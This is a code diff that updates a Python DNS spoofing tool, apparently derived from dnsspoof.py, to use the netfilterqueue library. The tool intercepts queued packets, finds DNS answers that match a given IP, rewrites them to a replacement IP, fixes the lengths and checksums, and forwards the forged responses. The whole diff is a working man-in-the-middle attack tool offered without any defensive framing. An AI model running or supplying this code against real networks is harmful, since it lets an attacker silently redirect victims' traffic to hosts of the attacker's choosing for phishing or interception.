@@ -1,7 +1,11 @@
+# Originally based on https://github.com/DanMcInerney/dnsspoof/blob/master/dnsspoof.py
+# Replaced https://github.com/blochberger/python-nfqueue
+# with
+# https://github.com/oremanj/python-netfilterqueue
+
 from twisted.internet import reactor
-from twisted.internet.interfaces import IReadDescriptor
 import os
-import nfqueue
+from netfilterqueue import NetfilterQueue
 from scapy.all import *
 import argparse
 import threading
@@ -13,19 +17,19 @@ def arg_parser():
     parser.add_argument("-r", "--replacement", help="Replacement IP")
     return parser.parse_args()
 
-def cb(payload):
-    data = payload.get_data()
+def cb(packet):
+    data = packet.get_payload()
     pkt = IP(data)
     # print packet
-    # pkt.show()
+    #pkt.show()
     if pkt.haslayer(DNSRR) and \
        pkt[DNS].an and \
        any(arg_parser().original == pkt[DNS].an[i].rdata for i in range(pkt[DNS].ancount)):
-        spoofed_pkt(payload, pkt, arg_parser().replacement)
+        spoofed_pkt(packet, pkt, arg_parser().replacement)
     else:
-        payload.set_verdict(nfqueue.NF_ACCEPT)
+        packet.accept()
 
-def spoofed_pkt(payload, pkt, rIP):
+def spoofed_pkt(packet, pkt, rIP):
     ip = pkt['IP']
     udp = pkt['UDP']
     dns = pkt['DNS']
@@ -34,27 +38,28 @@ def spoofed_pkt(payload, pkt, rIP):
 
         if (dnsrr.rdata == arg_parser().original):
             dnsrr.rdata = rIP
-            pkt[IP].len = len(str(pkt))
-            pkt[UDP].len = len(str(pkt[UDP]))
+            del pkt[IP].len
+            del pkt[UDP].len
             del pkt[IP].chksum
             del pkt[UDP].chksum
 
-    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
+    #print("Modified packet:")
+    #IP(bytes(pkt)).show()
+
+    packet.set_payload(bytes(pkt))
+    packet.accept()
     print ('[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1])
 
 class Queued(object):
     def __init__(self):
-        self.q = nfqueue.queue()
-        self.q.set_callback(cb)
-        self.q.fast_open(10500, socket.AF_INET)
-        self.q.set_queue_maxlen(5000)
+        self.q = NetfilterQueue()
+        self.q.bind(10500, cb)
         reactor.addReader(self)
-        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
         print('[*] Waiting for data')
     def fileno(self):
         return self.q.get_fd()
     def doRead(self):
-        self.q.process_pending(100)
+        self.q.run(block=False)
     def connectionLost(self, reason):
         reactor.removeReader(self)
     def logPrefix(self):
